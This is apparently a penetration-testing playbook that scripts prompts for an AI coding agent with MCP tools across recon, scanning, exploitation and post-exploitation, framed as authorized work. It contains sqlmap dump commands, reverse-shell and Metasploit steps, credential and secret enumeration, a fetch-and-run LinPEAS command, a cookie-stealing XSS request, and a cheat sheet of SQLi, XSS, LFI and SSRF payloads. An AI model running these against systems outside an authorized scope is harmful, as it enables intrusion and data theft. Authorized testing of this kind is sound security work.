# PLAYBOOK: Full Web Application Penetration Test
# April 2026 Red Team Stack
# Estimated time: 4-8 hours (AI-assisted) vs 2-3 days (manual)

---

## Pre-Engagement Checklist

- [ ] Written authorization confirmed and on file
- [ ] Scope document reviewed — in-scope URLs/IPs confirmed
- [ ] Out-of-scope items noted (third-party services, CDN, etc.)
- [ ] Rules of engagement agreed (business hours only? No DoS?)
- [ ] Emergency contact for client (if something breaks)
- [ ] `.env` loaded with target details
- [ ] `loot/[ENGAGEMENT_NAME]/` directory created

---

## PHASE 1 — ATTACK PATH PLANNING (PentestThinkingMCP)

**Prompt to Claude Code:**
```
I am conducting an authorized web application penetration test against [TARGET_URL].
Scope: [SCOPE_DESCRIPTION]. Authorization: [AUTH_REFERENCE].

Using PentestThinkingMCP, generate a Beam Search attack path plan.
Target context: [KNOWN_TECH_STACK if any].
Focus: web application vulnerabilities, OWASP Top 10 coverage.
```

**Expected output:** Prioritized attack path with 5-10 steps, tool recommendations per step, estimated CVSS impact for each.

---

## PHASE 2 — PASSIVE RECON (HexStrike)

**Prompt to Claude Code:**
```
Using hexstrike-ai MCP tools, run passive reconnaissance on [TARGET_DOMAIN]:
1. Subdomain enumeration: subfinder + amass + dnsx
2. Technology fingerprint: whatweb + wappalyzer
3. Historical data: waybackurls + gau (GetAllURLs)
4. Certificate transparency: crt.sh lookup
Save all results to loot/[ENGAGEMENT_NAME]/recon/
```

**Tools invoked by HexStrike:** subfinder, amass, dnsx, httpx, whatweb, gau, waybackurls

**Document:**
- Live subdomains list
- Technology stack (framework, server, CMS, WAF)
- Historical endpoints from archives
- Admin panels / login pages discovered

---

## PHASE 3 — ACTIVE ENUMERATION (HexStrike)

**Prompt to Claude Code:**
```
Now run active enumeration against [TARGET_URL] and all discovered subdomains.
Using hexstrike-ai web profile (93 tools):
1. Port scan all live hosts: nmap -sV --open
2. Directory brute-force: ffuf + gobuster with SecLists raft-large-directories
3. Parameter discovery: arjun on all discovered endpoints
4. JavaScript analysis: linkfinder + secretfinder
5. API endpoint discovery if applicable
```

**Watch for:**
- Admin panels (`/admin`, `/wp-admin`, `/phpmyadmin`, `/manager`)
- API docs (`/api/docs`, `/swagger`, `/api/v1`)
- Backup files (`.bak`, `.sql`, `.zip`, `.tar.gz`)
- Config files (`.env`, `config.php`, `web.config`)
- Source map files (`.js.map`)

---

## PHASE 4 — VULNERABILITY SCANNING (HexStrike Nuclei)

**Prompt to Claude Code:**
```
Run full vulnerability scan using hexstrike-ai:
1. Nuclei: full template set against all live URLs (4000+ templates)
   - Priority: critical, high severity first
2. OWASP Top 10 specific tests:
   - SQLi: sqlmap --batch --crawl=2
   - XSS: dalfox
   - SSRF: custom nuclei templates
   - XXE: burp-style payloads via Kali MCP
   - IDOR: manual check of identified endpoints
3. CMS-specific: wpscan (WordPress) / droopescan (Drupal) if detected
```

**Triage each finding immediately:**
- Critical/High → attempt PoC before moving on
- Medium → note for later validation
- Low/Info → log and skip for now

---

## PHASE 5 — EXPLOITATION (Kali MCP)

**For each confirmed vulnerability:**

### SQL Injection PoC
```
Using Kali MCP, run sqlmap against [VULNERABLE_URL]:
sqlmap -u "[URL]" --dbms=[DBMS] --batch --dump --level=3 --risk=2
```

### XSS PoC
```
Using Kali MCP, create a reflected XSS PoC payload for [PARAMETER] on [URL].
Test for stored XSS if applicable. Document cookie stealing capability.
```

### RCE / Shell
```
Using Kali MCP, set up a netcat listener on port 4444.
Then attempt [EXPLOIT_TYPE] against [TARGET].
If shell obtained: run id, whoami, hostname, uname -a, cat /etc/passwd
```

### Metasploit (via Kali MCP tmux)
```
Create tmux session 'msf'.
In that session, start msfconsole.
Use exploit/[MODULE], set RHOSTS [TARGET], set LHOST [KALI_IP], run.
```

---

## PHASE 6 — POST-EXPLOITATION (Kali MCP)

**If shell/access obtained:**

```
# Enumerate from initial foothold
id && whoami && hostname && uname -a
cat /etc/passwd | grep -v nologin
find / -perm -u=s -type f 2>/dev/null   # SUID binaries
sudo -l 2>/dev/null                       # Sudo privileges
cat /etc/crontab && ls /etc/cron.*       # Cron jobs
env | grep -i pass                        # Environment secrets
find / -name "*.conf" -readable 2>/dev/null | head -20
netstat -tulpn 2>/dev/null || ss -tulpn  # Internal services
```

**Privilege escalation:**
```
# Upload and run LinPEAS
Using Kali MCP: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lpe.sh && chmod +x /tmp/lpe.sh && /tmp/lpe.sh 2>&1 | tee /tmp/lpe_output.txt
```

---

## PHASE 7 — DOCUMENTATION & REPORTING

**Prompt to Claude Code:**
```
Based on all findings in loot/[ENGAGEMENT_NAME]/, generate a professional
penetration test report. Include:
- Executive Summary (non-technical, business impact focused)
- Technical Findings (one section per vulnerability, CVSS scored)
- PoC Evidence for each critical/high finding
- Remediation recommendations (specific, actionable)
- Risk ratings table

Format as markdown, save to loot/[ENGAGEMENT_NAME]/report.md
```

**Each finding section must include:**
```
### [FINDING NAME]
- **Severity:** Critical / High / Medium / Low
- **CVSS Score:** [X.X]
- **Affected Asset:** [URL/ENDPOINT]
- **Description:** [What is it?]
- **Evidence:** [Screenshot path or command output]
- **PoC Steps:** [Exact reproduction steps]
- **Business Impact:** [What can an attacker do?]
- **Remediation:** [Specific fix, not generic advice]
- **References:** [CVE, CWE, OWASP]
```

---

## Quick Reference — Common Payloads

### SQLi Test
```sql
' OR '1'='1
' OR 1=1--
'; DROP TABLE users;--
UNION SELECT NULL,NULL,NULL--
```

### XSS Test
```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
```

### LFI Test
```
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### SSRF Test
```
http://169.254.169.254/latest/meta-data/
http://localhost/admin
http://[::1]/admin
```

---

*April 2026 | Authorized use only*
